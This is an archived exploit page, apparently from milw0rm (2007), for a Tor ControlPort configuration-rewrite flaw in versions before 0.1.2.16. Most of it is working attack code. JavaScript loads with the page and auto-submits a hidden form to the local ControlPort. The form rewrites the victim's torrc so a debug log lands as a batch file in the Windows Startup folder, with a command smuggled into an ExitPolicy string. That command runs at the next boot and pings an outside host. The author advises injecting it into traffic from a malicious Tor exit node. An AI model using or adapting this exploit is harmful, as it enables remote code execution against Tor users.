<html><head><title>Tor < 0.1.2.16 ControlPort Remote Rewrite Exploit</title></head><pre>&lt;!-- 

Tor &lt; 0.1.2.16 with ControlPort enabled ( not default )
Exploit for Tor ControlPort &quot;torrc&quot; Rewrite Vulnerability http://secunia.com/advisories/26301

Rewrites the torrc to log to a different location: C:\Documents and Settings\All Users\Start Menu\Programs\Startup\t.bat
Also enables debug logging, and an erroneous ExitPolicy looking something like this: reject*:1337\'&amp;' calc.exe  this will output:
[debug] parse_addr_policy(): Adding new entry 'reject*:1337'&amp; calc.exe to the debug log -&gt; t.bat which will run calc.exe on next boot.

This is not very silent though, t.bat will contain something like 45 rows of crap which the user will see in about 1 sec, drop me a mail if you have a better way.

Either have a TOR user visit this HTML or inject it into her traffic when you're a TOR exit.
If you inject, just replace &lt;/HEAD&gt; with everything in &lt;HEAD&gt; + &lt;/HEAD&gt; ( that's why I tried to fit everything inside &lt;HEAD /&gt;), and fix Content-Length

// elgCrew _AT_ safe-mail.net
--&gt;

&lt;html&gt;
&lt;head&gt;
&lt;script language=&quot;javascript&quot;&gt;

window.onload = function()
{

	cmd = 'cls &amp; echo off &amp; ping -l 1329 my.tcpdump.co -n 1 -w 1 &gt; NUL &amp; del t.bat &gt; NUL &amp; exit';
	inject = '\r\nAUTHENTICATE\r\nSETCONF Log=\&quot;debug-debug file C:\\\\Documents and Settings\\\\All Users\\\\Start Menu\\\\Programs\\\\Startup\\\\t.bat\&quot;\r\nSAVECONF\r\nSIGNAL RELOAD\r\nSETCONF ExitPolicy=\&quot;reject*:1337\\\'&amp;' + cmd + '&amp;\&quot;\r\nSETCONF Log=\&quot;info file c:\\\\tor.txt\&quot;\r\nSAVECONF\r\nSIGNAL RELOAD\r\n';
	
	form51.area51.value = inject;
	document.form51.submit();
}
&lt;/script&gt;

&lt;form target=&quot;hiddenframe&quot; name=&quot;form51&quot; action=&quot;http://localhost.mil.se:9051&quot; method=POST enctype=&quot;multipart/form-data&quot;&gt;
&lt;input type=hidden name=area51&gt;
&lt;/form&gt;
&lt;iframe width=0 height=0 frameborder=0 name=&quot;hiddenframe&quot;&gt;&lt;/iframe&gt;
&lt;/head&gt;

&lt;body&gt;
&lt;pre&gt;
  ----
 | y0! |
  ----
          \  \_\_    _/_/
           \     (oo)\_______
                 |_|\        )*
                     ||----w |
                     ||     ||
&lt;/pre&gt;
&lt;/body&gt;
&lt;/html&gt;

# milw0rm.com [2007-09-29]</pre></html>